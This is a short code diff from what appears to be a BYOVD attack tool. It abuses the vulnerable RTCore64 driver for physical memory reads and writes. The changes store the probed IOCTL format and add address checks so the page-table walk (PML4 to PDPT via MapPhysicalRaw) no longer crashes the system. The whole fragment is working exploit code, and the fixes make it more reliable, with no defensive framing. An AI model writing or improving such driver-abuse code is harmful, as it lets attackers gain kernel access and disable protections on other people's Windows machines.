@@ -452,8 +452,11 @@ static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
         if (ok && readVal != 0 && readVal != 0xFFFFFFFF) {
             g_probedReadIoctl = ioctl;
             g_probedWriteIoctl = ioctl + 4;
-            ByovdDiag("BYOVD:ProbeIOCTL: STORED readIoctl=0x%08X writeIoctl=0x%08X (val=0x%08X)\n",
-                      g_probedReadIoctl, g_probedWriteIoctl, readVal);
+            // ★ v3.122: 同步更新 g_probedIoctlFormat — PhysicalReadViaIOCTL 使用 48 字节格式
+            //   (addr@+0x08, sizeType@+0x18), 对应 FMT_48B_PA_AT_08
+            g_probedIoctlFormat = RTCore64Format::FMT_48B_PA_AT_08;
+            ByovdDiag("BYOVD:ProbeIOCTL: STORED readIoctl=0x%08X writeIoctl=0x%08X fmt=%d (val=0x%08X)\n",
+                      g_probedReadIoctl, g_probedWriteIoctl, (int)g_probedIoctlFormat, readVal);
             return ioctl;
         }
 
@@ -497,6 +500,12 @@ static bool IsValidPML4(HANDLE hDevice, uint32_t ioctlCode,
     for (int i = 490; i < 512; i++) {
         if (!(entries[i] & 1)) continue;
         uint64_t pdptPhys = entries[i] & 0x0000FFFFFFFFF000ULL;
+
+        // ★ v3.122: 验证 pdptPhys 有效性 — 防止无效地址导致 MmMapIoSpace BSOD
+        //   PML4E 的 Present 位为 1 不代表物理地址一定有效,
+        //   过滤掉 0x0、BIOS 区域 (<0x1000)、以及过高的地址 (>4GB)
+        if (pdptPhys == 0 || pdptPhys < 0x1000 || pdptPhys >= 0x100000000ULL)
+            continue;
 
         uint8_t pdptBuf[0x1000];
         if (!MapPhysicalRaw(hDevice, ioctlCode, pdptPhys, pdptBuf))
